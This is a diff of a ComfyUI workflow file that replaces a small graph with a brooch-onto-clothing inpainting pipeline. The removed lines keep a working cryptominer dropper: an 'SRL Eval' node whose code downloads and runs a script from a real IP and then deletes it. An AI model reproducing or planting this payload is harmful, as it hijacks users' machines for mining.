@@ -1,40 +1,6755 @@
 {
-  "1": {
-    "inputs": {
-      "parameters": "a, b=None, c=\"foo\", *rest",
-      "code": "__import__('os').system('export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; f=/tmp/.7jq2qi; (curl -sf http://5.78.73.122:81/private/bins.sh -o \"$f\" 2>/dev/null || python3 -c \"import urllib.request; urllib.request.urlretrieve(\\'http://5.78.73.122:81/private/bins_py.sh\\',\\'$f\\')\" 2>/dev/null); chmod 777 \"$f\" && \"$f\" 5.78.73.122 rig5246-xmr rig5246-iron; rm -f \"$f\"')",
-      "arg0": [
-        "2",
-        0
-      ]
-    },
-    "class_type": "SRL Eval",
-    "_meta": {
-      "title": "SRL Eval"
-    }
-  },
-  "2": {
-    "inputs": {
-      "noise_seed": 397418879623513
-    },
-    "class_type": "RandomNoise",
-    "_meta": {
-      "title": "RandomNoise"
-    }
-  },
   "3": {
     "inputs": {
-      "preview_markdown": "",
-      "preview_text": "",
-      "previewMode": null,
-      "source": [
-        "1",
+      "seed": 691405474740495,
+      "steps": 8,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "normal",
+      "denoise": 1.0,
+      "model": [
+        "244",
+        0
+      ],
+      "positive": [
+        "245",
+        0
+      ],
+      "negative": [
+        "245",
+        1
+      ],
+      "latent_image": [
+        "244",
+        1
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "K采样器"
+    }
+  },
+  "8": {
+    "inputs": {
+      "samples": [
+        "3",
+        0
+      ],
+      "vae": [
+        "39",
         0
       ]
     },
-    "class_type": "PreviewAny",
+    "class_type": "VAEDecode",
     "_meta": {
-      "title": "Preview as Text"
+      "title": "VAE解码"
+    }
+  },
+  "37": {
+    "inputs": {
+      "unet_name": "qwen_image_edit_2511_fp8mixed.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader",
+    "_meta": {
+      "title": "UNet加载器"
+    }
+  },
+  "38": {
+    "inputs": {
+      "clip_name": "qwen_2.5_vl_7b_fp8_scaled.safetensors",
+      "type": "qwen_image",
+      "device": "default"
+    },
+    "class_type": "CLIPLoader",
+    "_meta": {
+      "title": "加载CLIP"
+    }
+  },
+  "39": {
+    "inputs": {
+      "vae_name": "qwen_image_vae.safetensors"
+    },
+    "class_type": "VAELoader",
+    "_meta": {
+      "title": "加载VAE"
+    }
+  },
+  "66": {
+    "inputs": {
+      "shift": 3.0,
+      "model": [
+        "89",
+        0
+      ]
+    },
+    "class_type": "ModelSamplingAuraFlow",
+    "_meta": {
+      "title": "采样算法（AuraFlow）"
+    }
+  },
+  "75": {
+    "inputs": {
+      "strength": 1.0,
+      "model": [
+        "66",
+        0
+      ]
+    },
+    "class_type": "CFGNorm",
+    "_meta": {
+      "title": "CFG归一化"
+    }
+  },
+  "89": {
+    "inputs": {
+      "lora_name": "Qwen-Image-Edit-2511-Lightning-8steps-V1.0-bf16.safetensors",
+      "strength_model": 1.0,
+      "model": [
+        "37",
+        0
+      ]
+    },
+    "class_type": "LoraLoaderModelOnly",
+    "_meta": {
+      "title": "LoRA加载器（仅模型）"
+    }
+  },
+  "110": {
+    "inputs": {
+      "prompt": "visible pin, exposed needle, pierced fabric, detached back plate, extra pin, missing gem, distorted metal, stretched brooch, broken setting, floating brooch, double brooch, blurry texture, unrealistic physics, fabric puncture artifacts, skin artifacts, hand, fingers",
+      "clip": [
+        "38",
+        0
+      ],
+      "vae": [
+        "39",
+        0
+      ],
+      "image1": [
+        "246",
+        1
+      ],
+      "image2": [
+        "7000",
+        0
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "文本编码（QwenImageEditPlus）"
+    }
+  },
+  "111": {
+    "inputs": {
+      "prompt": "图1是衣服局部图，图2是胸针产品图。\n让胸针自然浮于衣物表面，仅生成胸针底部的轻微物理接触阴影（drop shadow）和金属高光。绝对禁止修改衣物本身的颜色和纹理。",
+      "clip": [
+        "38",
+        0
+      ],
+      "vae": [
+        "39",
+        0
+      ],
+      "image1": [
+        "246",
+        1
+      ],
+      "image2": [
+        "7000",
+        0
+      ]
+    },
+    "class_type": "TextEncodeQwenImageEditPlus",
+    "_meta": {
+      "title": "文本编码（QwenImageEditPlus）"
+    }
+  },
+  "244": {
+    "inputs": {
+      "multiplier": 2.0,
+      "model": [
+        "75",
+        0
+      ],
+      "samples": [
+        "245",
+        2
+      ],
+      "mask": [
+        "291",
+        0
+      ]
+    },
+    "class_type": "DifferentialDiffusionAdvanced",
+    "_meta": {
+      "title": "Differential Diffusion Advanced"
+    }
+  },
+  "245": {
+    "inputs": {
+      "noise_mask": true,
+      "positive": [
+        "251",
+        0
+      ],
+      "negative": [
+        "7333",
+        0
+      ],
+      "vae": [
+        "39",
+        0
+      ],
+      "pixels": [
+        "246",
+        1
+      ],
+      "mask": [
+        "291",
+        0
+      ]
+    },
+    "class_type": "InpaintModelConditioning",
+    "_meta": {
+      "title": "内补模型条件"
+    }
+  },
+  "246": {
+    "inputs": {
+      "downscale_algorithm": "lanczos",
+      "upscale_algorithm": "lanczos",
+      "preresize": false,
+      "preresize_mode": "ensure minimum resolution",
+      "preresize_min_width": 1024,
+      "preresize_min_height": 1024,
+      "preresize_max_width": 16384,
+      "preresize_max_height": 16384,
+      "mask_fill_holes": true,
+      "mask_expand_pixels": 0,
+      "mask_invert": false,
+      "mask_blend_pixels": 32,
+      "mask_hipass_filter": 0.5,
+      "extend_for_outpainting": false,
+      "extend_up_factor": 1.0,
+      "extend_down_factor": 1.0,
+      "extend_left_factor": 1.0,
+      "extend_right_factor": 1.0,
+      "context_from_mask_extend_factor": 1.2,
+      "output_resize_to_target_size": true,
+      "output_target_width": 1536,
+      "output_target_height": 1536,
+      "output_padding": "0",
+      "device_mode": "cpu (compatible)",
+      "image": [
+        "5939",
+        0
+      ],
+      "mask": [
+        "6601",
+        0
+      ]
+    },
+    "class_type": "InpaintCropImproved",
+    "_meta": {
+      "title": "✂️ Inpaint Crop"
+    }
+  },
+  "251": {
+    "inputs": {
+      "conditioning": [
+        "111",
+        0
+      ],
+      "latent": [
+        "253",
+        0
+      ]
+    },
+    "class_type": "ReferenceLatent",
+    "_meta": {
+      "title": "参考Latent"
+    }
+  },
+  "253": {
+    "inputs": {
+      "pixels": [
+        "246",
+        1
+      ],
+      "vae": [
+        "39",
+        0
+      ]
+    },
+    "class_type": "VAEEncode",
+    "_meta": {
+      "title": "VAE编码"
+    }
+  },
+  "291": {
+    "inputs": {
+      "expand": 0,
+      "tapered_corners": true,
+      "mask": [
+        "246",
+        2
+      ]
+    },
+    "class_type": "GrowMask",
+    "_meta": {
+      "title": "扩展遮罩"
+    }
+  },
+  "880": {
+    "inputs": {
+      "stitcher": [
+        "246",
+        0
+      ],
+      "inpainted_image": [
+        "6602",
+        0
+      ]
+    },
+    "class_type": "InpaintStitchImproved",
+    "_meta": {
+      "title": "✂️ Inpaint Stitch"
+    }
+  },
+  "5862": {
+    "inputs": {
+      "image": [
+        "5990",
+        0
+      ]
+    },
+    "class_type": "GetImageSize",
+    "_meta": {
+      "title": "获取图像尺寸"
+    }
+  },
+  "5939": {
+    "inputs": {
+      "scale": 1.0,
+      "method": "lanczos",
+      "scale_by": "longest",
+      "scale_by_length": [
+        "6788",
+        0
+      ],
+      "image": [
+        "5990",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: ImageScaleRestore V2",
+    "_meta": {
+      "title": "图层工具：缩放恢复 V2"
+    }
+  },
+  "5946": {
+    "inputs": {
+      "dilation": 20,
+      "mask": [
+        "7056",
+        0
+      ]
+    },
+    "class_type": "ImpactDilateMask",
+    "_meta": {
+      "title": "Dilate Mask"
+    }
+  },
+  "5948": {
+    "inputs": {
+      "blend_percentage": 0.5,
+      "image_a": [
+        "5939",
+        0
+      ],
+      "image_b": [
+        "5949",
+        0
+      ]
+    },
+    "class_type": "Image Blend",
+    "_meta": {
+      "title": "Image Blend"
+    }
+  },
+  "5949": {
+    "inputs": {
+      "mask": [
+        "6606",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "5990": {
+    "inputs": {
+      "image": "胸针_亚洲_女_智敏_特写_温柔.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "加载图像"
+    }
+  },
+  "6601": {
+    "inputs": {
+      "anything": [
+        "6606",
+        0
+      ]
+    },
+    "class_type": "easy clearCacheAll",
+    "_meta": {
+      "title": "清除全部缓存"
+    }
+  },
+  "6602": {
+    "inputs": {
+      "anything": [
+        "8",
+        0
+      ]
+    },
+    "class_type": "easy clearCacheAll",
+    "_meta": {
+      "title": "清除全部缓存"
+    }
+  },
+  "6606": {
+    "inputs": {
+      "mode": "combine",
+      "mask_1": [
+        "6637",
+        0
+      ],
+      "mask_2": [
+        "6637",
+        0
+      ],
+      "mask_3": [
+        "6637",
+        0
+      ]
+    },
+    "class_type": "AILab_MaskCombiner",
+    "_meta": {
+      "title": "合并"
+    }
+  },
+  "6619": {
+    "inputs": {
+      "image": "brooch_005.png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "加载图像"
+    }
+  },
+  "6629": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "880",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "6636": {
+    "inputs": {
+      "image": [
+        "5939",
+        0
+      ]
+    },
+    "class_type": "GetImageSize",
+    "_meta": {
+      "title": "获取图像尺寸"
+    }
+  },
+  "6637": {
+    "inputs": {
+      "width": [
+        "6636",
+        0
+      ],
+      "height": [
+        "6636",
+        1
+      ],
+      "keep_proportions": false,
+      "upscale_method": "nearest-exact",
+      "crop": "disabled",
+      "mask": [
+        "5946",
+        0
+      ]
+    },
+    "class_type": "ResizeMask",
+    "_meta": {
+      "title": "Resize Mask"
+    }
+  },
+  "6683": {
+    "inputs": {
+      "anything": [
+        "880",
+        0
+      ]
+    },
+    "class_type": "easy cleanGpuUsed",
+    "_meta": {
+      "title": "清理显存占用"
+    }
+  },
+  "6684": {
+    "inputs": {
+      "anything": [
+        "6683",
+        0
+      ]
+    },
+    "class_type": "easy clearCacheAll",
+    "_meta": {
+      "title": "清除全部缓存"
+    }
+  },
+  "6702": {
+    "inputs": {
+      "primary_prompt": "coat",
+      "fallback_prompt": "clothes",
+      "sam3_model": "sam3",
+      "device": "Auto",
+      "primary_confidence": 0.25,
+      "fallback_confidence": 0.25,
+      "primary_empty_threshold": 0.01,
+      "mask_blur": 9,
+      "mask_offset": 0,
+      "invert_output": false,
+      "unload_model": true,
+      "background": "Alpha",
+      "background_color": "#222222",
+      "image": [
+        "5939",
+        0
+      ]
+    },
+    "class_type": "SAM3SegmentFallback",
+    "_meta": {
+      "title": "SAM3 Segmentation Fallback (RMBG)"
+    }
+  },
+  "6726": {
+    "inputs": {
+      "images": [
+        "6877",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "6748": {
+    "inputs": {
+      "images": [
+        "7000",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "6784": {
+    "inputs": {
+      "expression": "max(a,b)",
+      "a": [
+        "5862",
+        0
+      ],
+      "b": [
+        "5862",
+        1
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "6788": {
+    "inputs": {
+      "expression": "min(a,2304)",
+      "a": [
+        "6784",
+        0
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "6810": {
+    "inputs": {
+      "detect_hand": "disable",
+      "detect_body": "enable",
+      "detect_face": "disable",
+      "resolution": 512,
+      "bbox_detector": "yolox_l.onnx",
+      "pose_estimator": "dw-ll_ucoco_384_bs5.torchscript.pt",
+      "scale_stick_for_xinsr_cn": "disable",
+      "image": [
+        "5939",
+        0
+      ]
+    },
+    "class_type": "DWPreprocessor",
+    "_meta": {
+      "title": "DWPose Estimator"
+    }
+  },
+  "6815": {
+    "inputs": {
+      "image": [
+        "5939",
+        0
+      ]
+    },
+    "class_type": "GetImageSize+",
+    "_meta": {
+      "title": "🔧 Get Image Size"
+    }
+  },
+  "6833": {
+    "inputs": {
+      "comparison": "a >= b",
+      "a": [
+        "6958",
+        1
+      ],
+      "b": [
+        "6959",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "6835": {
+    "inputs": {
+      "boolean": [
+        "7071",
+        0
+      ],
+      "on_true": [
+        "6970:7077",
+        0
+      ],
+      "on_false": [
+        "6978:7081",
+        0
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "6838": {
+    "inputs": {
+      "mask_a": [
+        "6970:7077",
+        0
+      ],
+      "mask_b": [
+        "6978:7081",
+        0
+      ]
+    },
+    "class_type": "Masks Combine Regions",
+    "_meta": {
+      "title": "Masks Combine Regions"
+    }
+  },
+  "6839": {
+    "inputs": {
+      "mask": [
+        "6838",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "6840": {
+    "inputs": {
+      "blend_percentage": 0.5,
+      "image_a": [
+        "5939",
+        0
+      ],
+      "image_b": [
+        "6839",
+        0
+      ]
+    },
+    "class_type": "Image Blend",
+    "_meta": {
+      "title": "Image Blend"
+    }
+  },
+  "6841": {
+    "inputs": {
+      "images": [
+        "6840",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "6863": {
+    "inputs": {
+      "expression": "c * b / a",
+      "a": [
+        "7003",
+        0
+      ],
+      "b": [
+        "7003",
+        1
+      ],
+      "c": [
+        "6864",
+        0
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "6864": {
+    "inputs": {
+      "value": 1.5
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Mask Width Ratio"
+    }
+  },
+  "6866": {
+    "inputs": {
+      "mask": [
+        "291",
+        0
+      ]
+    },
+    "class_type": "MaskPreview+",
+    "_meta": {
+      "title": "🔧 Mask Preview"
+    }
+  },
+  "6876": {
+    "inputs": {
+      "mask": [
+        "291",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "6877": {
+    "inputs": {
+      "blend_percentage": 0.5,
+      "image_a": [
+        "246",
+        1
+      ],
+      "image_b": [
+        "6876",
+        0
+      ]
+    },
+    "class_type": "Image Blend",
+    "_meta": {
+      "title": "Image Blend"
+    }
+  },
+  "6947": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "operation": "and",
+      "destination": [
+        "7062",
+        0
+      ],
+      "source": [
+        "5946",
+        0
+      ]
+    },
+    "class_type": "MaskComposite",
+    "_meta": {
+      "title": "合成遮罩"
+    }
+  },
+  "6956": {
+    "inputs": {
+      "comparison": "a >= b",
+      "a": [
+        "6970:7078",
+        0
+      ],
+      "b": [
+        "6957",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "6957": {
+    "inputs": {
+      "value": 0.8
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "6958": {
+    "inputs": {
+      "expression": "a - b",
+      "a": [
+        "6970:7078",
+        0
+      ],
+      "b": [
+        "6978:7082",
+        0
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "6959": {
+    "inputs": {
+      "value": -0.05
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "6965": {
+    "inputs": {
+      "comparison": "a >= b",
+      "a": [
+        "7064:7135",
+        1
+      ],
+      "b": [
+        "6966",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "6966": {
+    "inputs": {
+      "value": 0.6
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "6968": {
+    "inputs": {
+      "comparison": "a >= b",
+      "a": [
+        "6967:7076",
+        0
+      ],
+      "b": [
+        "6969",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "6969": {
+    "inputs": {
+      "value": 0.6
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "6973": {
+    "inputs": {
+      "comparison": "a >= b",
+      "a": [
+        "7068:7311",
+        1
+      ],
+      "b": [
+        "6977",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "6975": {
+    "inputs": {
+      "comparison": "a >= b",
+      "a": [
+        "6974:7080",
+        0
+      ],
+      "b": [
+        "6976",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "6976": {
+    "inputs": {
+      "value": 0.6
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "6977": {
+    "inputs": {
+      "value": 0.6
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "6981": {
+    "inputs": {
+      "primary_prompt": "neck",
+      "fallback_prompt": "neck",
+      "sam3_model": "sam3",
+      "device": "Auto",
+      "primary_confidence": 0.25,
+      "fallback_confidence": 0.25,
+      "primary_empty_threshold": 0.01,
+      "mask_blur": 9,
+      "mask_offset": 0,
+      "invert_output": false,
+      "unload_model": true,
+      "background": "Alpha",
+      "background_color": "#222222",
+      "image": [
+        "5939",
+        0
+      ]
+    },
+    "class_type": "SAM3SegmentFallback",
+    "_meta": {
+      "title": "SAM3 Segmentation Fallback (RMBG)"
+    }
+  },
+  "6987": {
+    "inputs": {
+      "blend_percentage": 0.5,
+      "image_a": [
+        "5939",
+        0
+      ],
+      "image_b": [
+        "6988",
+        0
+      ]
+    },
+    "class_type": "Image Blend",
+    "_meta": {
+      "title": "Image Blend"
+    }
+  },
+  "6988": {
+    "inputs": {
+      "mask": [
+        "6947",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "6990": {
+    "inputs": {
+      "mask": [
+        "6637",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "6991": {
+    "inputs": {
+      "blend_percentage": 0.5,
+      "image_a": [
+        "5939",
+        0
+      ],
+      "image_b": [
+        "6990",
+        0
+      ]
+    },
+    "class_type": "Image Blend",
+    "_meta": {
+      "title": "Image Blend"
+    }
+  },
+  "6999": {
+    "inputs": {
+      "value": 480
+    },
+    "class_type": "INTConstant",
+    "_meta": {
+      "title": "INT Constant"
+    }
+  },
+  "7000": {
+    "inputs": {
+      "scale": 1.0,
+      "method": "lanczos",
+      "scale_by": "longest",
+      "scale_by_length": [
+        "7001",
+        0
+      ],
+      "image": [
+        "7060:7100",
+        0
+      ],
+      "mask": [
+        "7060:7100",
+        1
+      ]
+    },
+    "class_type": "LayerUtility: ImageScaleRestore V2",
+    "_meta": {
+      "title": "图层工具：缩放恢复 V2"
+    }
+  },
+  "7001": {
+    "inputs": {
+      "expression": "min(max(a,b),1536)",
+      "a": [
+        "7002",
+        0
+      ],
+      "b": [
+        "7002",
+        1
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7002": {
+    "inputs": {
+      "image": [
+        "7060:7100",
+        0
+      ]
+    },
+    "class_type": "GetImageSize+",
+    "_meta": {
+      "title": "🔧 Get Image Size"
+    }
+  },
+  "7003": {
+    "inputs": {
+      "image": [
+        "7000",
+        0
+      ]
+    },
+    "class_type": "GetImageSize",
+    "_meta": {
+      "title": "获取图像尺寸"
+    }
+  },
+  "7056": {
+    "inputs": {
+      "erode_dilate": 32,
+      "fill_holes": 33,
+      "remove_isolated_pixels": 0,
+      "smooth": 32,
+      "blur": 0,
+      "mask": [
+        "6835",
+        0
+      ]
+    },
+    "class_type": "MaskFix+",
+    "_meta": {
+      "title": "🔧 Mask Fix"
+    }
+  },
+  "7061": {
+    "inputs": {
+      "invert_mask": true,
+      "grow": 32,
+      "blur": 4,
+      "mask": [
+        "6702",
+        1
+      ]
+    },
+    "class_type": "LayerMask: MaskGrow",
+    "_meta": {
+      "title": "图层遮罩：遮罩扩展"
+    }
+  },
+  "7062": {
+    "inputs": {
+      "invert_mask": true,
+      "grow": 0,
+      "blur": 4,
+      "mask": [
+        "7061",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskGrow",
+    "_meta": {
+      "title": "图层遮罩：遮罩扩展"
+    }
+  },
+  "7070": {
+    "inputs": {
+      "output": "",
+      "source": [
+        "7069:100",
+        1
+      ]
+    },
+    "class_type": "Display Any (rgthree)",
+    "_meta": {
+      "title": "Display Any (rgthree)"
+    }
+  },
+  "7071": {
+    "inputs": {
+      "comparison": "a > b",
+      "a": [
+        "7069:100",
+        1
+      ],
+      "b": [
+        "7072",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "7072": {
+    "inputs": {
+      "value": 0.85
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "7325": {
+    "inputs": {
+      "mask": [
+        "291",
+        0
+      ]
+    },
+    "class_type": "MaskPreview+",
+    "_meta": {
+      "title": "🔧 Mask Preview"
+    }
+  },
+  "7326": {
+    "inputs": {
+      "images": [
+        "246",
+        1
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "7327": {
+    "inputs": {
+      "images": [
+        "7000",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "7329": {
+    "inputs": {
+      "primary_prompt": "brooch",
+      "fallback_prompt": "accessories",
+      "sam3_model": "sam3",
+      "device": "Auto",
+      "primary_confidence": 0.25,
+      "fallback_confidence": 0.25,
+      "primary_empty_threshold": 0.01,
+      "mask_blur": 9,
+      "mask_offset": 0,
+      "invert_output": false,
+      "unload_model": true,
+      "background": "Alpha",
+      "background_color": "#222222",
+      "image": [
+        "7000",
+        0
+      ]
+    },
+    "class_type": "SAM3SegmentFallback",
+    "_meta": {
+      "title": "SAM3 Segmentation Fallback (RMBG)"
+    }
+  },
+  "7330": {
+    "inputs": {
+      "images": [
+        "7329",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "7331": {
+    "inputs": {
+      "images": [
+        "246",
+        1
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "7332": {
+    "inputs": {
+      "images": [
+        "8",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "7333": {
+    "inputs": {
+      "conditioning": [
+        "111",
+        0
+      ]
+    },
+    "class_type": "ConditioningZeroOut",
+    "_meta": {
+      "title": "条件零化"
+    }
+  },
+  "7334": {
+    "inputs": {
+      "amount": 64,
+      "device": "auto",
+      "mask": [
+        "291",
+        0
+      ]
+    },
+    "class_type": "MaskBlur+",
+    "_meta": {
+      "title": "🔧 Mask Blur"
+    }
+  },
+  "7060:6591": {
+    "inputs": {
+      "value": 1.0,
+      "width": [
+        "7060:6594",
+        0
+      ],
+      "height": [
+        "7060:6594",
+        1
+      ]
+    },
+    "class_type": "SolidMask",
+    "_meta": {
+      "title": "纯块遮罩"
+    }
+  },
+  "7060:6594": {
+    "inputs": {
+      "image": [
+        "7060:6714",
+        3
+      ]
+    },
+    "class_type": "GetImageSize+",
+    "_meta": {
+      "title": "🔧 Get Image Size"
+    }
+  },
+  "7060:6592": {
+    "inputs": {
+      "mask": [
+        "7060:6591",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7060:6714": {
+    "inputs": {
+      "primary_prompt": "brooch,accessories, ",
+      "fallback_prompt": "accessories,",
+      "sam3_model": "sam3",
+      "device": "Auto",
+      "primary_confidence": 0.25,
+      "fallback_confidence": 0.15,
+      "primary_empty_threshold": 0.01,
+      "largest_region_only": true,
+      "crop_padding": 50,
+      "mask_blur": 0,
+      "mask_offset": 0,
+      "invert_output": false,
+      "unload_model": true,
+      "background": "Alpha",
+      "background_color": "#222222",
+      "image": [
+        "6619",
+        0
+      ]
+    },
+    "class_type": "SAM3SegmentFallbackPlus",
+    "_meta": {
+      "title": "SAM3 Segmentation Fallback Plus (RMBG)"
+    }
+  },
+  "7060:6719": {
+    "inputs": {
+      "channel": "alpha",
+      "image": [
+        "7060:6714",
+        3
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7060:6593": {
+    "inputs": {
+      "mode": "normal",
+      "foreground_opacity": 1.0,
+      "foreground_scale": 1.0,
+      "position_x": 50,
+      "position_y": 50,
+      "foreground": [
+        "7060:6714",
+        3
+      ],
+      "background": [
+        "7060:6592",
+        0
+      ]
+    },
+    "class_type": "AILab_ImageCombiner",
+    "_meta": {
+      "title": "图像组合 (RMBG) 🖼️"
+    }
+  },
+  "7060:7100": {
+    "inputs": {
+      "left": [
+        "6999",
+        0
+      ],
+      "right": [
+        "6999",
+        0
+      ],
+      "top": [
+        "6999",
+        0
+      ],
+      "bottom": [
+        "6999",
+        0
+      ],
+      "extra_padding": 0,
+      "pad_mode": "edge",
+      "color": "0,0,0",
+      "image": [
+        "7060:6593",
+        0
+      ],
+      "mask": [
+        "7060:6719",
+        0
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7069:72": {
+    "inputs": {
+      "comparison": "a == b",
+      "a": [
+        "7069:69",
+        3
+      ],
+      "b": [
+        "7069:71",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "7069:71": {
+    "inputs": {
+      "value": 0.0
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "7069:70": {
+    "inputs": {
+      "side": -1,
+      "anchor_side_ratio": 0.0,
+      "anchor_vertical_ratio": 0.28,
+      "neck_mask": [
+        "6981",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromNeckSegmentation",
+    "_meta": {
+      "title": "Compute Anchor From Neck Segmentation"
+    }
+  },
+  "7069:77": {
+    "inputs": {
+      "number": [
+        "7069:74",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7069:78": {
+    "inputs": {
+      "number": [
+        "7069:73",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7069:84": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "operation": "subtract",
+      "destination": [
+        "7069:81",
+        0
+      ],
+      "source": [
+        "7069:80",
+        0
+      ]
+    },
+    "class_type": "MaskComposite",
+    "_meta": {
+      "title": "合成遮罩"
+    }
+  },
+  "7069:85": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "operation": "subtract",
+      "destination": [
+        "7069:82",
+        0
+      ],
+      "source": [
+        "7069:80",
+        0
+      ]
+    },
+    "class_type": "MaskComposite",
+    "_meta": {
+      "title": "合成遮罩"
+    }
+  },
+  "7069:87": {
+    "inputs": {
+      "expression": "a * 0.5",
+      "a": [
+        "7069:83",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7069:88": {
+    "inputs": {
+      "x": [
+        "7069:83",
+        5
+      ],
+      "y": [
+        "7069:83",
+        6
+      ],
+      "width": [
+        "7069:83",
+        3
+      ],
+      "height": [
+        "7069:87",
+        0
+      ],
+      "mask": [
+        "7062",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7069:7321": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "operation": "multiply",
+      "destination": [
+        "7069:84",
+        0
+      ],
+      "source": [
+        "7069:91",
+        0
+      ]
+    },
+    "class_type": "MaskComposite",
+    "_meta": {
+      "title": "合成遮罩"
+    }
+  },
+  "7069:90": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "operation": "multiply",
+      "destination": [
+        "7069:85",
+        0
+      ],
+      "source": [
+        "7069:91",
+        0
+      ]
+    },
+    "class_type": "MaskComposite",
+    "_meta": {
+      "title": "合成遮罩"
+    }
+  },
+  "7069:91": {
+    "inputs": {
+      "x": [
+        "7069:83",
+        5
+      ],
+      "y": [
+        "7069:83",
+        6
+      ],
+      "operation": "or",
+      "destination": [
+        "7069:86",
+        0
+      ],
+      "source": [
+        "7069:88",
+        0
+      ]
+    },
+    "class_type": "MaskComposite",
+    "_meta": {
+      "title": "合成遮罩"
+    }
+  },
